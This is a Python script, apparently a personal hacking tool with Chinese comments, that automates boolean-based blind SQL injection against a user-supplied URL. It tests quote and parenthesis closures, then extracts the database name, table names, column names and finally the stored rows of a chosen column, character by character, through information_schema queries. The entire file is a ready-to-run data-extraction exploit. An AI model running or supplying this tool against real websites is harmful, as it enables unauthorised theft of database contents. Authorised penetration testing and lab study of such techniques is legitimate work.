# -*- coding:utf-8 -*-
# 作者: kracer127
import requests
import time

def bihe_method(): #判断闭合方式
    bihe_list = ["","'","')","'))",'"','")','"))',")","))"]
    new_bihe_list = []
    real_bihe_list = []
    flag = 0
    print("[-]开始测试注入的闭合方式......")
    for i in range(0, 9):    #判读输入的页面成功信息是否正确
        db_payload = url + bihe_list[i] + " and 1 --+"
        r = requests.get(db_payload)
        if str not in r.text:
            flag += 1
    #以flag为标志，判读程序是否继续进行......
    if(flag != 9):
        # 找到能行的闭合方式
        for i in range(0, 8):
            db_payload = url + bihe_list[i] + "and 1 --+"
            r = requests.get(db_payload)
            if str in r.text:
                new_bihe_list.append(bihe_list[i])
                real_bihe_list.append(bihe_list[i])
        # 筛选出绝对能行的闭合方式
        for i in range(len(new_bihe_list)):
            db_payload1 = url + new_bihe_list[i]
            db_payload2 = db_payload1 + " and (select length(database())=2) --+"
            db_payload3 = db_payload1 + " and (select length(database())=7) --+"
            db_payload4 = db_payload1 + " and (select length(database())=11) --+"
            # print(db_payload2)
            r2 = requests.get(db_payload2)
            r3 = requests.get(db_payload3)
            r4 = requests.get(db_payload4)
            # str1 = "Your Login name"
            if (str in r2.text) and (str in r3.text) and (str in r4.text):
                p = new_bihe_list[i]
                real_bihe_list.remove(p)
        if(len(real_bihe_list)==0):
            print("[-]失败，请检查该点是否为注入点后再尝试！！！")
        else:
            print("[+]成功，得到注入的闭合方式:%s\n" % real_bihe_list)
            db_length(url, str, real_bihe_list)
        # print(len(real_bihe_list))
    elif(flag == 9):
        print("[-]失败，请输入注入正确后的页面提示信息！！！")
    return real_bihe_list

#生成字符列表字典
def ascii_str():  #
    str_list1 = []
    for i in range(33, 127):  # mysql中可用的所有可显示字符
        str_list1.append(chr(i))
    str_list = list(reversed(str_list1))
    return str_list


def db_length(url, str, real_bihe_list):
    print("[-]开始测试数据库名长度......")
    flag = True
    for i in range(len(real_bihe_list)):
        for j in range(2,40):
            db_payload = url + real_bihe_list[i] + " and (select length(database())=%d) --+" % j
            # print(db_payload)
            r = requests.get(db_payload)
            # str1 = "You are in"
            if str in r.text:
                db_length = j
                print("[+]成功，数据库长度为：%d\n" %db_length)
    global url1
    url1 = url + real_bihe_list[0]
    db_name(db_length)  # 测试库名程序入口


def db_name(db_length):
	print("[-]开始测试数据库名.......")
	db_name=''
	str_list = ascii_str()
	for i in range(1,db_length+1):
		for j in str_list:
			db_payload=url1 + ' and ((select substr((select database()),%s,1))="%s") --+' % (i,j)
			r = requests.get(db_payload)
			if str in r.text:
				db_name+=j
				break
	print("[+]成功，数据库名：%s\n"%db_name)
	tb_piece(db_name)    #进行下一步，测试该数据库下有几张表
	return db_name

#测试该网站下的数据库有几张表 可以与下面的猜解表名函数合并
def tb_piece(db_name):
    print("[-]开始测试%s数据库有几张表......." % db_name)
    for i in range(100):  # 猜解库中有多少张表，合理范围即可
        tb_payload = url1 + " and (select count(table_name) from information_schema.tables where table_schema='%s')=%d --+" % (db_name, i)
        r = requests.get(tb_payload)
        if str in r.text:
            tb_sum = i
            break
    print("[+]成功，%s库一共有%d张表\n" % (db_name, tb_sum))
    tb_name(db_name, tb_sum)  # 进行下一步，猜解表名


def tb_name(db_name, tb_sum):
    print("[-]开始对%s库猜解其所有表名......" % db_name)
    tb_name_list = []
    for i in range(tb_sum):
        str_list = ascii_str()
        tb_name = ''
        for j in range(2, 30):  # 这里是猜表名的长度，可以优化
            tb_payload = url1 + ' and ((select length(table_name) from information_schema.tables where table_schema="%s" limit %d,1)=%d) --+' % (db_name, i, j)
            r = requests.get(tb_payload)
            if str in r.text:
                for k in range(1, j + 1):  # 根据表名长度进行获得具体表名
                    for L in str_list:
                        tb_payload1 = url1 + ' and ((select substr((select table_name from information_schema.tables where table_schema="%s" limit %d,1),%d,1))="%s") --+' % (db_name, i, k, L)
                        r = requests.get(tb_payload1)
                        if str in r.text:
                            tb_name += L
                            break
                tb_name_list.append(tb_name)
                break
    print("[+]成功，得到%s库下的%s张表：%s\n" % (db_name, tb_sum, tb_name_list))
    table_name = input("请输入要爆破的表名:")
    column_num(table_name, db_name)  # 进行下一步，猜解每张表的字段数


def column_num(table_name, db_name):
    print("[-]开始猜解您所选表的字段数量：.......")
    column_num_list = []
    for i in range(30):  # 每张表的字段数量，合理范围即可
        column_payload = url1 + ' and ((select count(column_name) from information_schema.columns where table_name="%s" and table_schema="%s")=%d) --+' % (table_name, db_name, i)
        r = requests.get(column_payload)
        if str in r.text:
            column_num = i
            print("[+]成功，%s表有%s个字段\n" % (table_name, column_num),end='')
            break
    column_name(table_name, column_num, db_name)  # 进行下一步，猜解每张表的字段名


def column_name(table_name, column_num, db_name):
    print("[-]开始猜解您所选表的各字段名......")
    str_list = ascii_str()
    column_name_list = []
    print("[+]成功，%s表的字段名如下：" % table_name)
    for i in range(int(column_num)):  # i表示每张表的字段数量
        column_name = ''
        column_length = 0
        for j in range(1, 21):  # 爆破字段的长度
            column_name_length = url1 + ' and ((select length(column_name) from information_schema.columns where table_name="%s" and table_schema="%s" limit %d,1)=%d) --+' % (table_name, db_name, i, j)
            r = requests.get(column_name_length)
            if str in r.text:
                column_length = j
                break
        for t in range(1, column_length+1):
            for k in str_list:  # 爆破字段名
                column_payload = url1 + ' and ((select substr((select column_name from information_schema.columns where table_name="%s" and table_schema="%s" limit %d,1),%d,1))="%s") --+' % (table_name, db_name, i, t, k)
                r = requests.get(column_payload)
                if str in r.text:
                    column_name += k
                    break
        print('[+]：%s' % column_name)
        column_name_list.append(column_name)
    dump_data(table_name, column_name_list, db_name)  # 进行最后一步，输出指定字段的数据


def dump_data(table_name, column_name_list, db_name):
    column_name = input("请选择您要爆破的字段：")
    print("\n[-]开始对%s表的%s字段进行爆破......" % (table_name, column_name))
    str_list = ascii_str()
    for i in range(1200):  # 测出该字段下有多少个数据
        data_num_payload = url1 + " and (select count(%s) from %s.%s)=%d --+" % (column_name, db_name, table_name, i)
        r = requests.get(data_num_payload)
        if str in r.text:
            data_num = i
            break
    print("[+]成功，%s表中的%s字段有以下%s条数据：" % (table_name, column_name, data_num))
    data_name = ''
    data_name_list = []
    for j in range(data_num):  #根据字段下的数据 条数 来爆破具体数据名
        data_len = 0
        data_name = ''
        for k in range(1, 21):  # 测试字段下的具体数据的长度
            data_num_payload = url1 + " and ((select length(%s) from %s.%s limit %s,1)=%d) --+" % (column_name, db_name, table_name, j, k)
            r = requests.get(data_num_payload)
            if str in r.text:
                data_len = k
                break
        for L in range(1, data_len+1):  #根据长度爆破数据名
            for t in str_list:   #根据字符串集来爆破具体数据名
                data_name_payload = url1 + ' and ((select substr((select %s from %s limit %s,1),%s,1))="%s") --+' % (column_name, table_name, j, L, t)
                # print(data_name_payload)
                r = requests.get(data_name_payload)
                if str in r.text:
                    data_name += t
                    break
        data_name_list.append(data_name)
    print('[+]成功，%s字段下有如下数据%s' % (column_name, data_name_list))  # 输出该字段下的每条数据

if __name__ == '__main__':
    start = time.time()
    url = input("请输入含有注入点的目标url：")     # 含有注入点的目标url
    str = input("请输入网站页面注入成功的信息：")           # 布尔型盲注的true&false的判断因素
    bihe_method()
    end = time.time()
    run_time = round((end-start),2)
    print("Running time:%s s" % run_time)
